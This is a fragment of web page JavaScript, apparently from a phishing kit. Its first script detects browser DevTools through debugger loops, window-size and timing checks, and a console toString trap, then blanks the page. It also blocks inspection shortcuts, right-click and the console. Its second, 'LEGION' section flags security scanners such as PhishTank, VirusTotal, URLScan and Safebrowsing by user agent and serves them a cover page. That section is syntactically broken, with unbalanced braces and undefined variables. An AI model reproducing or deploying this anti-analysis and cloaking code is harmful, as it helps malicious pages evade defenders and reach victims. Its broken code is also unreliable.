  <script>
    (function(){
      var _nuked=!1;
      function nuke(){
        if(_nuked) return; _nuked=!0;
        try{ document.documentElement.innerHTML=''; }catch(e){}
        try{ location.replace('about:blank'); }catch(e){}
      }

      // ── 1. Worker debugger — survives "Deactivate Breakpoints" ──
      try{
        var _wb=new Blob(['setInterval(function(){debugger;},50);'],{type:'application/javascript'});
        new Worker(URL.createObjectURL(_wb));
      }catch(e){}

      // ── 2. Main thread obfuscated debugger ──
      setInterval(function(){
        (function(){}['constructor']('debugger'))();
      },80);

      // ── 3. Size detection — DevTools docked (side/bottom) ──
      // Threshold 200px — safe for all normal browser states
      function _sz(){
        if(_nuked) return;
        var dw=window.outerWidth-window.innerWidth;
        var dh=window.outerHeight-window.innerHeight;
        if(dw>200||dh>200){ nuke(); }
      }
      // Delay first check 2s so page can fully load
      setTimeout(function(){ _sz(); setInterval(_sz,500); },2000);
      window.addEventListener('resize',function(){ setTimeout(_sz,100); });

      // ── 4. Timing attack — runs 3s after load to avoid extension overhead ──
      setTimeout(function(){
        (function _chkTime(){
          var t=performance.now();
          (function(){}['constructor']('debugger'))();
          if(performance.now()-t>200){ nuke(); }
          setTimeout(_chkTime,1000);
        })();
      },3000);

      // ── 5. Keyboard block — F12, Ctrl+Shift+I/J/K/C, Ctrl+U/S, Cmd+Alt+I ──
      document.addEventListener('keydown',function(e){
        if(e.keyCode===123){ e.preventDefault(); e.stopImmediatePropagation(); return!1; }
        if(e.ctrlKey&&e.shiftKey&&[73,74,75,67,69,88].indexOf(e.keyCode)!==-1){ e.preventDefault(); e.stopImmediatePropagation(); return!1; }
        if(e.metaKey&&e.altKey&&[73,74,75,67].indexOf(e.keyCode)!==-1){ e.preventDefault(); e.stopImmediatePropagation(); return!1; }
        if(e.ctrlKey&&[85,83].indexOf(e.keyCode)!==-1){ e.preventDefault(); e.stopImmediatePropagation(); return!1; }
      },!0);

      // ── 6. Right-click + text select + drag disable ──
      document.addEventListener('contextmenu',function(e){ e.preventDefault(); return!1; },!0);
      document.addEventListener('selectstart',function(e){ e.preventDefault(); return!1; },!0);
      document.addEventListener('dragstart',function(e){ e.preventDefault(); return!1; },!0);

      // ── 7. Console silence (no nuke — avoids extension false positives) ──
      var _cm=['log','warn','error','info','debug','table','dir','trace','group','groupEnd','clear'];
      _cm.forEach(function(m){ try{ console[m]=function(){}; }catch(e){} });

      // ── 8. toString RegExp trap — fires only when DevTools formats object ──
      // Runs after 1s delay to skip extension init
      setTimeout(function(){
        if(_nuked) return;
        var _r=/./;
        _r.toString=function(){ nuke(); };
        try{ console.log('%c',_r); }catch(e){}
      },1000);

      // ── 9. Firebug detection ──
      setInterval(function(){
        if(_nuked) return;
        if(window.Firebug&&window.Firebug.chrome&&window.Firebug.chrome.isInitialized){ nuke(); }
      },1000);

    })();
  </script>

    var __LEGION_IS_MOBILE = /android|iphone|ipad|ipod|mobile|tablet/i.test(navigator.userAgent||'') ||

    // ── Step 1: Hard bot signals ──────────────────────────────
    window.__LEGION_IS_BOT = (function () {

        var ua = navigator.userAgent || '';
        if (/PhishTank|VirusTotal|URLScan|Safebrowsing|Sucuri|Netcraft|NetcraftSurveyAgent|GoogleBot|Bingbot|YandexBot|AhrefsBot|SemrushBot|DotBot|MJ12bot|DataForSeo|Bytespider|GPTBot|ClaudeBot|CCBot|PetalBot|Applebot|meta-external|Google-Extended|Amazonbot|CloudflareBrowserRenderingCrawler/i.test(ua)) return true;

        // Mobile browsers always have 0 plugins — skip this check for them
        if (!__LEGION_IS_MOBILE && (!navigator.plugins || navigator.plugins.length === 0)) return true;
      } catch (e) {}
      return false;
    })();

    // ── Step 2: Cloaking decision ─────────────────────────────
    window.__LEGION_SHOW_COVER = (function () {
      // Mobile is always a real user — never show cover regardless of bot flags
      if (__LEGION_IS_MOBILE) return false;

      try {

        // Social traffic = real user
        if (isSocial) return false;
      } catch (e) {}

      // Desktop + no social signals = scanner, reviewer, or stray crawler
      return true;
